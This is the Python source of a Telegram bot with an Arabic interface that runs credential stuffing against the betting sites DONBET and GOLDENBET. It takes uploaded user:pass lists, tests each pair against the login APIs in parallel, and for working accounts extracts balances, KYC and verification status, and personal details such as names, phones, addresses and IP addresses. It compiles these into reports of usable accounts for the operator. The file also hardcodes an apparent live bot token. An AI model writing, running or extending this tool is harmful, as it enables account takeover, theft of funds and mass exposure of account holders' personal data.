import requests
import json
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ----------------- إعدادات البوت -----------------
BOT_TOKEN = "8606519407:AAG6QxZbjypnFwkEuizU3yb5JDzmPCPWVoc" 
bot = telebot.TeleBot(BOT_TOKEN)

# عدد الخيوط (Threads) للفحص
MAX_WORKERS = 4

# قاموس لتخزين بيانات المستخدمين الحالية
user_sessions = {}

# ----------------- الإعدادات الخاصة بموقع DONBET -----------------
DONBET_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    'Content-Type': "application/json",
    'origin': "https://m.donbet.com",
    'referer': "https://m.donbet.com/en",
    'accept-language': "en-US,en;q=0.9,ar;q=0.8"
}

# ----------------- الإعدادات الخاصة بموقع GOLDENBET -----------------
GOLDENBET_HEADERS = {
    "authority": "m.goldenbet.com",
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "origin": "https://m.goldenbet.com",
    "referer": "https://m.goldenbet.com/eng/static/login",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
}
GOLDENBET_COOKIES = {"language": "en"}

# ----------------- دالة فحص حساب واحد (Donbet) -----------------
def check_donbet_account(account, stats):
    username, password = account
    try:
        with requests.Session() as session:
            session.headers.update(DONBET_HEADERS)
            login_payload = {"UserName": username.strip(), "Password": password.strip(), "ConfirmationStatus": None}
            login_resp = session.post("https://m.donbet.com/api/profile/login", json=login_payload, timeout=10)
            
            if login_resp.status_code == 200 and login_resp.json().get("status") == 1:
                profile_resp = session.get("https://m.donbet.com/api/profile/p/getprofile", timeout=10)
                profile_data = profile_resp.json() if profile_resp.status_code == 200 else {}
                
                wallets_resp = session.get("https://m.donbet.com/api/profile/p/getwallets", timeout=10)
                wallets_data = wallets_resp.json() if wallets_resp.status_code == 200 else []
                wallet_info = wallets_data[0] if wallets_data else {}
                
                wallet_info_resp = session.get("https://m.donbet.com/api/profile/GetUserWalletInfo", params={'CurrencyId': "302"}, timeout=10)
                wallet_info_data = wallet_info_resp.json() if wallet_info_resp.status_code == 200 else {}
                
                kyc_status = profile_data.get("KYCStatus", False)
                current_points = wallet_info_data.get("CurrentPointSum", 0.0) or 0.0
                balance = wallet_info.get("Balance", 0)
                balance_usd = wallet_info.get("BalanceUSD", 0.0)
                is_high_points = current_points > 100
                
                account_data = {
                    "login": username, "password": password, "kyc_status": kyc_status,
                    "current_points": current_points, "total_points": wallet_info_data.get("TotalPointSum", 0.0),
                    "balance": balance, "balance_usd": balance_usd, "email": profile_data.get("Email", ""),
                    "user_name": profile_data.get("UserName", username), "country_id": profile_data.get("CountryId", ""),
                    "created_date": profile_data.get("CreateDate", "")
                }
                
                stats['checked'] += 1
                stats['valid'] += 1
                if kyc_status: stats['kyc_verified'] += 1
                if is_high_points: stats['high_points'] += 1
                return (username, password, True, account_data, kyc_status, is_high_points)
            else:
                stats['invalid'] += 1
                stats['checked'] += 1
                return (username, password, False, None, False, False)
    except:
        stats['invalid'] += 1
        stats['checked'] += 1
        return (username, password, False, None, False, False)

# ----------------- دالة فحص حساب واحد (Goldenbet) -----------------
def check_goldenbet_account(account, stats):
    username, password = account
    try:
        with requests.Session() as session:
            session.headers.update(GOLDENBET_HEADERS)
            session.cookies.update(GOLDENBET_COOKIES)
            
            login_payload = {"UserName": username.strip(), "Password": password.strip(), "ConfirmationStatus": None}
            login_resp = session.post("https://m.goldenbet.com/api/profile/login", json=login_payload, timeout=15)
            
            if login_resp.status_code == 200 and login_resp.json().get("status") == 1:
                user_info = login_resp.json().get("response", {})
                wallet_resp = session.get("https://m.goldenbet.com/api/profile/p/getwallets", timeout=10)
                wallet_data = wallet_resp.json() if wallet_resp.status_code == 200 else []
                wallet_info = wallet_data[0] if wallet_data else {}
                
                profile_resp = session.get("https://m.goldenbet.com/api/profile/p/getprofile", timeout=10)
                profile_data = profile_resp.json() if profile_resp.status_code == 200 else {}
                
                kyc_status = profile_data.get("KYCStatus", False)
                deposited_before = profile_data.get("Deposited", False)
                phone_verified = profile_data.get("PhoneVerified", False)
                mail_verified = profile_data.get("MailVerified", False)
                is_verified = kyc_status or deposited_before or phone_verified or mail_verified
                
                account_data = {
                    "login": username, "password": password, "user_name": user_info.get("UserName", ""),
                    "first_name": user_info.get("FirstName", ""), "last_name": user_info.get("LastName", ""),
                    "email": user_info.get("Email", ""), "kyc_status": kyc_status, "deposited_before": deposited_before,
                    "phone_verified": phone_verified, "mail_verified": mail_verified, "balance": wallet_info.get("Balance", 0),
                    "balance_usd": wallet_info.get("BalanceUSD", 0.0), "user_profile_id": user_info.get("UserProfileID", ""),
                    "birth_date": profile_data.get("BirthDate", ""), "gender": "ذكر" if profile_data.get("Gender") == 1 else "أنثى" if profile_data.get("Gender") == 2 else "غير محدد",
                    "mobile": profile_data.get("Mobile", ""), "city": profile_data.get("City", ""), "address": profile_data.get("Address", ""),
                    "region_state": profile_data.get("RegionState", ""), "zip_code": profile_data.get("ZipCode", ""),
                    "bonus_points": wallet_info.get("BonusPoints", 0.0), "frozen_balance": wallet_info.get("FrozenBalance", 0),
                    "currency_id": wallet_info.get("CurrencyId", ""), "created_date": profile_data.get("CreateDate", ""),
                    "last_online": profile_data.get("LastOnlineDate", ""), "country_id": profile_data.get("CountryId", ""),
                    "ip_address": profile_data.get("IpAddress", ""), "brand_id": profile_data.get("BrandId", ""),
                    "deposit_allowed": profile_data.get("DepositAllowed", False), "withdraw_allowed": profile_data.get("WithdrawAllowed", False),
                    "bet_allowed": profile_data.get("BetAllowed", False)
                }
                
                stats['checked'] += 1
                stats['valid'] += 1
                if kyc_status: stats['kyc_verified'] += 1
                if deposited_before: stats['has_deposited'] += 1
                if phone_verified: stats['phone_verified'] += 1
                if mail_verified: stats['mail_verified'] += 1
                if is_verified: stats['verified'] += 1
                
                return (username, password, True, account_data, is_verified)
            else:
                stats['invalid'] += 1
                stats['checked'] += 1
                return (username, password, False, None, False)
    except:
        stats['invalid'] += 1
        stats['checked'] += 1
        return (username, password, False, None, False)

# ----------------- توليد الرسائل والتحكم بالأزرار -----------------
def make_progress_text(site, stats, total):
    progress = (stats['checked'] / total) * 100 if total > 0 else 0
    if site == "donbet":
        return (f"🔄 *جاري فحص الحسابات لموقع DONBET...*\n\n"
                f"📈 التقدم: {stats['checked']}/{total} ({progress:.1f}%)\n"
                f"✅ صالحة: {stats['valid']}\n"
                f"❌ خاطئة: {stats['invalid']}\n"
                f"🆔 توثيق KYC: {stats['kyc_verified']}\n"
                f"🪙 نقاط عـالية (>100): {stats['high_points']}")
    else:
        return (f"🔄 *جاري فحص الحسابات لموقع GOLDENBET...*\n\n"
                f"📈 التقدم: {stats['checked']}/{total} ({progress:.1f}%)\n"
                f"✅ صالحة: {stats['valid']}\n"
                f"❌ خاطئة: {stats['invalid']}\n"
                f"🆔 توثيق KYC: {stats['kyc_verified']}\n"
                f"💰 حسابات بها إيداع: {stats['has_deposited']}\n"
                f"📱 هاتف مفعل: {stats['phone_verified']}\n"
                f"📧 إيميل مفعل: {stats['mail_verified']}\n"
                f"🔒 إجمالي المحققة/النشطة: {stats['verified']}")

def make_progress_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔄 تحديث الإحصائيات", callback_data="refresh_stats"))
    markup.row(InlineKeyboardButton("❌ إلغاء الفحص", callback_data="stop_checking"))
    return markup

def auto_update_loop(chat_id, message_id, user_id):
    while True:
        time.sleep(4)
        if user_id not in user_sessions or not user_sessions[user_id].get('is_running', False):
            break
        session_data = user_sessions[user_id]
        if session_data['stats']['checked'] >= session_data['total']:
            break
        try:
            text = make_progress_text(session_data['site'], session_data['stats'], session_data['total'])
            bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=make_progress_keyboard())
        except:
            pass

# ----------------- أوامر واستجابات البوت -----------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_sessions[message.from_user.id] = {}
    text = "👋 مرحباً بك في بوت فحص الحسابات الاحترافي!\n\n📌 *اختر الموقع الذي تريد فحص حساباته من الأزرار أدناه:*"
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🎰 موقع DONBET", callback_data="select_donbet"))
    markup.row(InlineKeyboardButton("🥇 موقع GOLDENBET", callback_data="select_goldenbet"))
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data in ["select_donbet", "select_goldenbet"]:
        site = "donbet" if call.data == "select_donbet" else "goldenbet"
        user_sessions[user_id] = {"site": site, "is_running": False}
        bot.answer_callback_query(call.id, f"تم اختيار {site.upper()}")
        bot.edit_message_text(f"📥 *ممتاز! لقد اخترت موقع {site.upper()}*\n\nقم الآن بإرسال ملف الحسابات بصيغة `.txt` (يحتوي على الحسابات بتنسيق `user:pass`).", chat_id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "refresh_stats":
        if user_id in user_sessions and user_sessions[user_id].get('is_running', False):
            session_data = user_sessions[user_id]
            text = make_progress_text(session_data['site'], session_data['stats'], session_data['total'])
            try:
                bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=make_progress_keyboard())
                bot.answer_callback_query(call.id, "🔄 تم التحديث")
            except:
                bot.answer_callback_query(call.id, "🔄 البيانات محدثة بالفعل")
        else:
            bot.answer_callback_query(call.id, "❌ لا يوجد فحص نشط حالياً")
            
    elif call.data == "stop_checking":
        if user_id in user_sessions and user_sessions[user_id].get('is_running', False):
            user_sessions[user_id]['is_running'] = False
            bot.answer_callback_query(call.id, "🛑 تم إيقاف الفحص")
            bot.edit_message_text("🛑 تم إيقاف عملية الفحص. جاري معالجة وإرسال الملفات المستخرجة حتى الآن...", chat_id, call.message.message_id)

@bot.message_handler(content_types=['document'])
def handle_accounts_file(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id not in user_sessions or "site" not in user_sessions[user_id]:
        bot.reply_to(message, "❌ من فضلك استخدم الأمر /start أولاً واشتر الموقع المراد فحصه عبر الأزرار.")
        return
        
    if user_sessions[user_id].get('is_running', False):
        bot.reply_to(message, "⚠️ هناك عملية فحص جارية بالفعل لحسابك، انتظر حتى تنتهي أو اضغط إلغاء.")
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ عذراً، يرجى إرسال ملف نصي ينتهي بـ `.txt` فقط.")
        return

    status_msg = bot.reply_to(message, "⏳ جاري تحميل وقراءة الملف...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        accounts = []
        lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        for line in lines:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    accounts.append((parts[0].strip(), parts[1].strip()))
                    
        total = len(accounts)
        if total == 0:
            bot.edit_message_text("❌ لم يتم العثور على أي حسابات بالتنسيق الصحيح `user:pass` داخل الملف.", chat_id, status_msg.message_id)
            return
            
        site = user_sessions[user_id]['site']
        
        if site == "donbet":
            stats = {'valid': 0, 'invalid': 0, 'kyc_verified': 0, 'high_points': 0, 'checked': 0}
        else:
            stats = {'valid': 0, 'invalid': 0, 'kyc_verified': 0, 'has_deposited': 0, 'phone_verified': 0, 'mail_verified': 0, 'verified': 0, 'checked': 0}
            
        user_sessions[user_id].update({
            'is_running': True, 'stats': stats, 'total': total
        })
        
        bot.edit_message_text(f"🚀 تم بدء فحص {total} حساب على موقع {site.upper()}...", chat_id, status_msg.message_id, reply_markup=make_progress_keyboard())
        
        threading.Thread(target=auto_update_loop, args=(chat_id, status_msg.message_id, user_id), daemon=True).start()
        threading.Thread(target=process_checker_threads, args=(user_id, chat_id, status_msg.message_id, accounts), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء معالجة الملف: {str(e)}")

# ----------------- معالجة عملية الفحص وإرسال النتائج -----------------
def process_checker_threads(user_id, chat_id, message_id, accounts):
    session_data = user_sessions[user_id]
    site = session_data['site']
    stats = session_data['stats']
    total = session_data['total']
    
    short_report = f"{site}_verified_accounts_{user_id}.txt"
    detailed_report = f"{site}_detailed_report_{user_id}.txt"
    points_report = f"donbet_high_points_{user_id}.txt"
    
    # حذف أي مخلفات قديمة قبل البدء
    for path in [short_report, detailed_report, points_report]:
        if os.path.exists(path): os.remove(path)
        
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        if site == "donbet":
            future_to_account = {executor.submit(check_donbet_account, acc, stats): acc for acc in accounts}
        else:
            future_to_account = {executor.submit(check_goldenbet_account, acc, stats): acc for acc in accounts}
            
        for future in as_completed(future_to_account):
            if not user_sessions.get(user_id, {}).get('is_running', False):
                break
                
            try:
                res = future.result()
                if site == "donbet":
                    username, password, is_valid, account_data, is_kyc, is_high_points = res
                    if is_valid and account_data:
                        line = f"{username}:{password} | KYC={account_data['kyc_status']} | Points={account_data['current_points']} | Balance={account_data['balance']} | Email={account_data['email']}\n"
                        with open(short_report, 'a', encoding='utf-8') as f: f.write(line)
                        if is_high_points:
                            with open(points_report, 'a', encoding='utf-8') as f: f.write(line)
                        
                        with open(detailed_report, 'a', encoding='utf-8') as f:
                            f.write("=" * 50 + "\n")
                            f.write(f"✅ الحساب: {username}:{password}\n")
                            f.write(f"👤 المستخدم: {account_data['user_name']} | 📧 البريد: {account_data['email']}\n")
                            f.write(f"🆔 توثيق الـ KYC: {'محلول ✅' if is_kyc else 'غير محلول ❌'}\n")
                            f.write(f"🪙 النقاط الحالية: {account_data['current_points']} | الكلية: {account_data['total_points']}\n")
                            f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$)\n")
                            f.write("=" * 50 + "\n\n")
                else:
                    username, password, is_valid, account_data, is_verified = res
                    if is_valid and account_data:
                        line = f"{username}:{password} | KYC={account_data['kyc_status']} | Deposited={account_data['deposited_before']} | Phone={account_data['phone_verified']} | Mail={account_data['mail_verified']} | Balance={account_data['balance']} | Email={account_data['email']}\n"
                        with open(short_report, 'a', encoding='utf-8') as f: f.write(line)
                        
                        with open(detailed_report, 'a', encoding='utf-8') as f:
                            f.write("=" * 60 + "\n")
                            f.write(f"✅ حساب GOLDENBET: {username}:{password}\n")
                            f.write(f"👤 الاسم: {account_data['first_name']} {account_data['last_name']} | المستخدم: {account_data['user_name']}\n")
                            f.write(f"📧 الإيميل: {account_data['email']} | 📞 الهاتف: {account_data['mobile']}\n")
                            f.write(f"🔐 التحقق: KYC={account_data['kyc_status']} | إيداع={account_data['deposited_before']} | هاتف={account_data['phone_verified']} | إيميل={account_data['mail_verified']}\n")
                            f.write(f"💰 الرصيد: {account_data['balance']} ({account_data['balance_usd']}$) | مكافأة: {account_data['bonus_points']}\n")
                            f.write(f"📊 البلد: {account_data['country_id']} | تاريخ الإنشاء: {account_data['created_date']}\n")
                            f.write("=" * 60 + "\n\n")
            except:
                pass

    # ----------------- نهاية الفحص وإرسال الملفات المستخرجة -----------------
    user_sessions[user_id]['is_running'] = False
    try: bot.delete_message(chat_id, message_id)
    except: pass
    
    final_text = (f"🏁 *اكتملت عملية الفحص لموقع {site.upper()}!*\n\n"
                  f"📊 إجمالي الحسابات المفحوصة: {stats['checked']}/{total}\n"
                  f"✅ صالحة (Valid): {stats['valid']}\n"
                  f"❌ خاطئة (Invalid): {stats['invalid']}\n")
    bot.send_message(chat_id, final_text, parse_mode="Markdown")

    # إرسال الملفات للمستخدم وحذفها فوراً من السيرفر لتوفير المساحة
    if os.path.exists(short_report) and os.path.getsize(short_report) > 0:
        with open(short_report, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"✅ جميع الحسابات الصالحة الشغالة لـ {site.upper()}")
        os.remove(short_report)
        
    if os.path.exists(detailed_report) and os.path.getsize(detailed_report) > 0:
        with open(detailed_report, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"📄 التقرير المفصل للحسابات والبيانات الداخلية لـ {site.upper()}")
        os.remove(detailed_report)
        
    if site == "donbet" and os.path.exists(points_report) and os.path.getsize(points_report) > 0:
        with open(points_report, 'rb') as f:
            bot.send_document(chat_id, f, caption="🪙 حسابات دونبيت ذات النقاط العالية (>100)")
        os.remove(points_report)

if __name__ == "__main__":
    print("🤖 البوت تم إصلاحه بنجاح ويعمل الآن بدون تداخل...")
    bot.infinity_polling()
